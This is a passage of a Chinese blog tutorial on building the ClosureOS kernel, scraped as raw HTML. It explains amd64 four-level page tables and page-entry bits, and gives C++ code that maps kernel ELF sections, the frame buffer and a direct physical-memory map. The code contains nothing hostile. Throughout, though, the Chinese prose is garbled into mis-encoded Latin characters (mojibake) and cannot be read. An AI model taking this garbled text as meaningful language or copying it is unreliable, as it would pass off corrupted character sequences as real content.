class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in frame buffer */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">boot_tty_has_fb</span>()) &#123;<br>        <span class="hljs-keyword">if</span> ((addr &gt;= (mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_base)<br>            &amp;&amp; (addr &lt;= (mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_end)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in multiboot tags */</span><br>    <span class="hljs-keyword">if</span> ((addr &gt;= multiboot_tag_start) &amp;&amp; (addr &lt;= multiboot_tag_end)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é¡µè¡¨é‡å»ºç«‹"><a href="#é¡µè¡¨é‡å»ºç«‹" class="headerlink" title="é¡µè¡¨é‡å»ºç«‹"></a>é¡µè¡¨é‡å»ºç«‹</h2><p>æœ‰äº†ä¸´æ—¶çš„åŠ¨æ€å†…å­˜åˆ†é…å™¨ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹ <strong>å»ºç«‹ä¸€ä¸ªå¸¸è§„çš„å››çº§é¡µè¡¨ï¼Œå¹¶å°†å†…æ ¸æœ¬ä½“å¯¹åº”çš„ç‰©ç†å†…å­˜æ˜ å°„åˆ°é«˜ç«¯å†…å­˜ç©ºé—´</strong> ï¼Œå®Œæˆè¿™ä¸€éƒ¨åˆ†çš„åˆå§‹åŒ–å·¥ä½œä¹‹åæˆ‘ä»¬çš„åç»­å·¥ä½œéƒ½å°†åœ¨é«˜åŠéƒ¨å†…æ ¸å®Œæˆ</p><p>é¦–å…ˆæ˜¯é¡µè¡¨æ˜ å°„çš„å»ºç«‹ï¼Œé¡µè¡¨ä¸»è¦ç”¨äºå°†ç”±é¡µè¡¨æ‰€å®šä¹‰çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ˜ å°„åˆ°ç‰©ç†åœ°å€ç©ºé—´ä¸Šï¼Œåœ¨ CPU è¿›è¡Œå†…å­˜è®¿é—®æ—¶å†…å­˜ç®¡ç†å•å…ƒï¼ˆMemory Management Unitï¼‰ä¼šæ ¹æ®é¡µè¡¨å°†è™šæ‹Ÿåœ°å€ç¿»è¯‘ï¼ˆtranslateï¼‰æˆç‰©ç†åœ°å€ï¼Œåœ¨çº¯ 64 ä½æ¨¡å¼ä¸‹è™šæ‹Ÿåœ°å€çš„æœ€å¤§é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œåœ¨å…¼å®¹æ¨¡å¼ä¸‹è™šæ‹Ÿåœ°å€ä»…èƒ½ç”¨å‰ 4 å­—èŠ‚ï¼Œä¸”éœ€è¦é¢å¤–ç»å†åŸºäºåˆ†æ®µçš„ç¿»è¯‘ï¼Œ <strong>æˆ‘ä»¬çš„ ClosureOS ä¸ºçº¯ 64 ä½ç³»ç»Ÿï¼Œæš‚æ—¶ä¸è€ƒè™‘ 32 ä½çš„æƒ…å†µ</strong> ï¼š</p><blockquote><p>æ³¨ï¼š <em>æœ¬ç« </em> æš‚æ—¶ä¸è€ƒè™‘ <em>ç¿»è¯‘åå¤‡ç¼“å†²åŒº</em> ï¼ˆTranslation Lookaside Bufferï¼‰ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å…ˆè‡ªè¡Œäº†è§£</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png" alt="amd64 ä¸‹çš„é¡µè¡¨ç¿»è¯‘è¿‡ç¨‹"></p><p>64 ä½ä¸‹æœ€å¸¸ç”¨çš„æ˜¯ 4 çº§é¡µè¡¨ç»“æ„ï¼Œé¡µé¡¶çº§è¡¨çš„åœ°å€è¢«å­˜æ”¾åœ¨ CR3 å¯„å­˜å™¨ä¸­ï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸€å¼ å†…å­˜é¡µè¢«è®¾å®šä¸º 4KBï¼Œå•æ¡é¡µè¡¨é¡¹çš„é•¿åº¦ä¸º 8 å­—èŠ‚ï¼š</p><ul><li>å¯¹äºè™šæ‹Ÿåœ°å€è€Œè¨€ï¼Œå‰ 12 ä½è¢«ç”¨æ¥è¡¨ç¤ºå†…å­˜é¡µå†…çš„åç§»ï¼›å¯¹äºé¡µè¡¨é¡¹è€Œè¨€ï¼Œå‰ 12 ä½ç”¨äºå­˜æ”¾é¡µæƒé™ç­‰ä¿¡æ¯</li><li>å‰©ä¸‹çš„ 36 ä½æ¯ 9 ä½ç”¨æ¥è¡¨ç¤ºåœ¨é¡µè¡¨ä¸åŒçº§åˆ«çš„åç§»ï¼Œå¼€å¯ 5 çº§åˆ†é¡µåé¢å¤–å¤šç”¨ 9 ä½è¡¨ç¤ºç¬¬ 5 çº§çš„åç§»ï¼Œå¦åˆ™ä½œä¸ºä¿ç•™ä½</li><li>å‰©ä¸‹ 7 ä½ç”¨ä½œæ‰©å±•</li></ul><p><img src="https://s2.loli.net/2024/06/20/SvC9YmyWuphJosO.png" alt="4 çº§é¡µè¡¨ç»“æ„ï¼Œæ¥è‡ª AMD64 Architecture Programmer&#39;s Manual Volume 2"></p><p>çº¯ 64 ä½æ¨¡å¼ä¸‹ï¼Œ4K é¡µçš„é¡µè¡¨é¡¹ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2024/06/20/QoBCNTfJPAzwvxr.png"></p><p>å‰ 12 ä½çš„å„ä½è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><strong>AVL</strong>ï¼šavailableï¼Œè¯¥é¡µæ˜¯å¦å¯ç”¨ï¼Œå¯å¿½ç•¥</li><li><strong>G</strong>ï¼šæ˜¯å¦ä¸º<strong>å…¨å±€é¡µ</strong>ï¼Œå…¨å±€é¡µä¼šè¢«ä¿å­˜åœ¨ TLB ä¸­æ–¹ä¾¿è°ƒç”¨ï¼›1ä¸ºæ˜¯</li><li><strong>PAT</strong>ï¼šé¡µå±æ€§è¡¨ä½ï¼Œç”¨ä»¥åœ¨åˆ†çº§é¡µè¡¨ä¸­è®¾å®šé¡µçš„å±æ€§ï¼Œè¿™é‡Œæš‚ä¸”å…ˆç½®0</li><li><strong>D</strong>ï¼šDirtyï¼Œå½“ä¸€å¼ å†…å­˜é¡µè¢«å†™å…¥æ—¶ï¼ŒCPUä¼šå°†è¯¥é¡µ<strong>æ ‡è„</strong>ï¼Œä»…é’ˆå¯¹é¡µè¡¨é¡¹æœ‰æ•ˆ</li><li><strong>A</strong>ï¼šAccessedï¼Œè¯¥é¡µæ¯æ¬¡è¢«è®¿é—®æ—¶è¯¥ä½éƒ½ä¼šè¢«ç½®1ï¼Œå®šæœŸæ¸…é›¶ï¼Œç½®1æ¬¡æ•°ç”¨ä»¥è¡¨ç¤ºä½¿ç”¨é¢‘ç‡</li><li><strong>PCD</strong>ï¼šPage-level Cache Disableï¼Œ0 ä¸ºå¯ç”¨é«˜é€Ÿç¼“å­˜ï¼Œ1 ä¸ºç¦æ­¢</li><li><strong>PWT</strong>ï¼šPage-level Write-Throughï¼Œé¡µçº§é€šå†™ä½ï¼Œä¸é«˜é€Ÿç¼“å­˜æœ‰å…³ï¼Œè¿™é‡Œæš‚ä¸”ç½® 0</li><li><strong>US</strong>ï¼šUser&#x2F;Supervisorï¼Œæƒé™ä½ï¼Œ1 æ—¶ ring0~ring3 å‡å¯è®¿é—®è¯¥é¡µï¼Œ0æ—¶ä»… ring0~ring2 å¯è®¿é—®ï¼ˆä¸€èˆ¬æ¥è¯´æ“ä½œç³»ç»Ÿåªéœ€è¦ç”¨åˆ° ring0 ä¸ ring3ï¼‰</li><li><strong>RW</strong>ï¼šå³ Read&#x2F;Writeï¼Œè¯¥ä½ä¸º 1 æ—¶è¯¥é¡µå¯è¯»å†™ï¼Œå¦åˆ™åªå¯è¯»ä¸å¯å†™</li><li><strong>P</strong>ï¼šPresentï¼Œå³è¯¥é¡µæ˜¯å¦å­˜åœ¨ï¼Œ0 è¡¨ç¤ºè¯¥é¡µä¸å­˜åœ¨äºç‰©ç†é¡µä¸­ï¼Œæ­¤æ—¶å¯¹è¯¥é¡µçš„è®¿é—®ä¼šå¼•å‘ç¼ºé¡µå¼‚å¸¸</li></ul><p>æˆ‘ä»¬çš„ ClosureOS ä½¿ç”¨çš„æ˜¯å¸¸è§„çš„ 4 çº§é¡µè¡¨ä¸ 4KB é¡µå¤§å°ï¼Œå› ä¸ºè¿™æ›´é€‚åˆæˆ‘ä»¬å¯¹ä¸åŒçš„å†…å­˜åŒºåŸŸè¿›è¡Œæ›´åŠ ç»†ç²’åº¦çš„æ˜ å°„ç®¡ç†ï¼Œå¯¹äºé¡µè¡¨çš„æ˜ å°„å»ºç«‹æ“ä½œï¼Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥åˆ†é…å„çº§é¡µè¡¨é¡¹çš„ç©ºé—´åå†™å…¥å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ <strong>é«˜çº§é¡µç›®å½•è¡¨é¡¹æƒé™ä¼šé™åˆ¶ä½çº§é¡µè¡¨é¡¹çš„æƒé™ï¼Œå› æ­¤å¯¹äºå­˜åœ¨æ˜ å°„çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸï¼Œé™¤äº†æœ€åä¸€çº§é¡µè¡¨é¡¹ä»¥å¤–çš„é¡µç›®å½•è¡¨é¡¹æˆ‘ä»¬éƒ½åº”å½“ç»™äºˆå¯å†™çš„æƒé™</strong> ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PDE_DEFAULT     (PDE_ATTR_P | PDE_ATTR_RW)</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_map</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> pgtable,</span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">virt_addr_t</span> va,</span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">phys_addr_t</span> pa, </span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">page_attr_t</span> attr)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">pgd_t</span> *pgd;<br>    <span class="hljs-type">pud_t</span> *pud;<br>    <span class="hljs-type">pmd_t</span> *pmd;<br>    <span class="hljs-type">pte_t</span> *pte;<br>    <span class="hljs-type">int</span> pgd_i = <span class="hljs-built_in">PGD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pud_i = <span class="hljs-built_in">PUD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pmd_i = <span class="hljs-built_in">PMD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pte_i = <span class="hljs-built_in">PTE_ENTRY</span>(va);<br><br>    pgd = (<span class="hljs-type">pgd_t</span>*) pgtable;<br>    <span class="hljs-keyword">if</span> (!pgd[pgd_i]) &#123;<br>        pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pgd[pgd_i])) &#123;<br>            pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pgd[pgd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pgd[pgd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pud = (<span class="hljs-type">pud_t</span>*) (pgd[pgd_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pud[pud_i]) &#123;<br>        pud[pud_i] = (<span class="hljs-type">pud_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pud[pud_i])) &#123;<br>            pud[pud_i] = (<span class="hljs-type">pud_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pud[pud_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pud[pud_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pmd = (<span class="hljs-type">pmd_t</span>*) (pud[pud_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pmd[pmd_i]) &#123;<br>        pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pmd[pmd_i])) &#123;<br>            pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pmd[pmd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pmd[pmd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pte = (<span class="hljs-type">pte_t</span>*) (pmd[pmd_i] &amp; PAGE_MASK);<br>    pte[pte_i] = pa | attr;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹é‡æ–°å»ºç«‹æ–°çš„é¡µè¡¨æ˜ å°„äº†ï¼Œæˆ‘ä»¬é¦–å…ˆæ˜ å°„è¿™å‡ ä¸ªåŒºåŸŸï¼š</p><ul><li><p>å†…æ ¸ ELFï¼Œç”¨äºæ­£å¸¸æ‰§è¡Œä»£ç </p></li><li><p>å†…å­˜ç›´æ¥æ˜ å°„åŒºï¼Œæ˜ å°„æ•´ä¸ªå·²çŸ¥çš„ç‰©ç†å†…å­˜ç©ºé—´ï¼Œç”¨äºç›´æ¥è®¿é—®ç‰©ç†å†…å­˜ä»¥åŠåç»­çš„å†…æ ¸å°å¯¹è±¡å†…å­˜åˆ†é…å™¨</p></li><li><p>æ­¤å¤–ï¼Œå¯¹äºå­˜åœ¨ frame buffer çš„æƒ…å†µï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ˜ å°„ frame buffer æ‰€åœ¨å†…å­˜</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> *shdr;<br>    <span class="hljs-type">void</span> *shdr_end;<br>    mm::<span class="hljs-type">phys_addr_t</span> seg_phys_start, seg_phys_end;<br>    mm::<span class="hljs-type">virt_addr_t</span> seg_virt_start, seg_virt_end;<br>    mm::<span class="hljs-type">page_attr_t</span> pte_attr;<br>    mm::<span class="hljs-type">phys_addr_t</span> physmem_start, physmem_end;<br>    mm::Page *pgdb_base;<br>    base::<span class="hljs-type">size_t</span> pgdb_page_nr;<br>    <span class="hljs-type">int</span> ret;<br><br>    boot_kern_pgtable = (mm::<span class="hljs-type">phys_addr_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) boot_kern_pgtable)) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FAILED to allocate new page table!&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br>    <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) boot_kern_pgtable, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    <span class="hljs-comment">/* map kernel ELF */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-built_in">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (elf64_shdr*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (elf64_shdr*) ((mm::<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-built_in">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> (!(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_PROGBITS) &#123;    <span class="hljs-comment">/* for .text, .data, .rodata */</span><br>            seg_phys_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset - PAGE_SIZE;<br>            seg_phys_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_phys_start + shdr-&gt;sh_size);<br>            seg_virt_start =shdr-&gt;sh_addr;<br><br>            <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_phys_start += PAGE_SIZE;<br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_NOBITS) &#123;   <span class="hljs-comment">/* for .bss */</span><br>            seg_virt_start = shdr-&gt;sh_addr;<br>            seg_virt_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_virt_start + shdr-&gt;sh_size);<br><br>            <span class="hljs-keyword">while</span> (seg_virt_start &lt; seg_virt_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                seg_phys_start = (mm::<span class="hljs-type">phys_addr_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) seg_phys_start)) &#123;<br>                    <span class="hljs-keyword">return</span> -ENOMEM;<br>                &#125;<br><br>                <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) seg_phys_start, <span class="hljs-number">0</span>, PAGE_SIZE);<br>                ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">/* unknown but we need to allocate??? */</span><br>            <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] Unknown segment. ELF mapping stopped.&quot;</span>);<br>            <span class="hljs-keyword">return</span> -EFAULT;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for frame buffer */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">boot_tty_has_fb</span>()) &#123;<br>        seg_phys_start = ((mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_base) &amp; PAGE_MASK;<br>        seg_virt_start = seg_phys_start;<br>        seg_phys_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_phys_start + <span class="hljs-built_in">boot_tty_fb_sz</span>());<br>        <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>            ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                      seg_virt_start,<br>                                      seg_phys_start,<br>                                      PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            seg_phys_start += PAGE_SIZE;<br>            seg_virt_start += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for direct mapping area */</span><br>    physmem_start = physmem_end = <span class="hljs-number">0x0000000000000000</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr &amp; PAGE_MASK;<br>        mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        mm::<span class="hljs-type">virt_addr_t</span> vaddr = base + mm::KERN_DIRECT_MAP_REGION_BASE;<br><br>        <span class="hljs-keyword">if</span> (end &gt; physmem_end) &#123;<br>            physmem_end = end;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vaddr &lt; base) &#123;<br>            <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;[x] FATAL: memory region base 0x&quot;</span>);<br>            <span class="hljs-built_in">boot_printhex</span>(base);<br>            <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot; has caused an integer overflow in memory mapping.&quot;</span>);<br>            <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot; hlt &quot;</span>)</span></span>;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> (vaddr &gt; mm::KERN_DIRECT_MAP_REGION_END) &#123;   <span class="hljs-comment">/* out of 64TB */</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                vaddr,<br>                                base,<br>                                PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>            vaddr += PAGE_SIZE;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><h3 id="Extra-æ·»åŠ -KASLR-æ”¯æŒ"><a href="#Extra-æ·»åŠ -KASLR-æ”¯æŒ" class="headerlink" title="Extra. æ·»åŠ  KASLR æ”¯æŒ"></a><em>Extra. æ·»åŠ  KASLR æ”¯æŒ</em></h3><blockquote><p>å’•å’•å’• ğŸ•ŠğŸ•ŠğŸ•Š</p><p>æš‚æ—¶å…ˆç•™ç»™å¤§å®¶å½“è¯¾åä½œä¸šäº†ï¼Œtipsï¼šæ˜ å°„å‰ç»™å‡ ä¸ªå˜é‡åŠ ä¸Šåç§»å€¼å°±è¡Œï¼Œä¸è¿‡ä½ æˆ–è®¸è¿˜éœ€è¦é¢å¤–ä¿®æ”¹ä¸€äº›é“¾æ¥ flagsï¼Ÿ ï¼š ï¼‰</p></blockquote><h2 id="å»ºç«‹å†…å­˜é¡µæ•°æ®åº“"><a href="#å»ºç«‹å†…å­˜é¡µæ•°æ®åº“" class="headerlink" title="å»ºç«‹å†…å­˜é¡µæ•°æ®åº“"></a>å»ºç«‹å†…å­˜é¡µæ•°æ®åº“</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹å»ºç«‹ <strong>å†…å­˜é¡µæ•°æ®åº“</strong> ï¼ˆpage 